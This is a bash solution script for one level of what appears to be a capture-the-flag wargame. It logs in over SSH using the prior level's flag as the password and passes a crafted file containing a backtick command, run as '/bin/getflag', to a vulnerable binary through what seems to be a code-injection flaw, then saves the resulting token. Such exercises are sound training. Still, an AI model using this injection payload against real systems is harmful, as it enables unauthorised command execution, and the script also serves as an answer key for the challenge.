#!/usr/bin/env bash

if [ "$(dirname "$0")" == "." ]; then
	ROOT_DIR=$(dirname $(dirname $PWD))
else
	ROOT_DIR=$(dirname $(dirname $(dirname "$0")))
fi

SCRIPT=$(cat <<EOF
echo '[x \${\`/bin/getflag\`}]' > /tmp/flag06;
./level06 /tmp/flag06 2>&1 >/dev/null | awk 'NR==1 {print $NF}'
EOF
)

if [ ! -z "$1" ]; then
	PASS=$(sshpass -p $(cat $ROOT_DIR/level05/flag) ssh level06@$1 -p 4242 "$SCRIPT")
	PASS=$(echo $PASS | awk 'NR==1 {print $NF}')
	echo "$PASS"
	echo "$PASS" | awk 'END{print}' > flag06.pwd
else
	echo "Usage: ./flag06.sh <ip address>"
fi
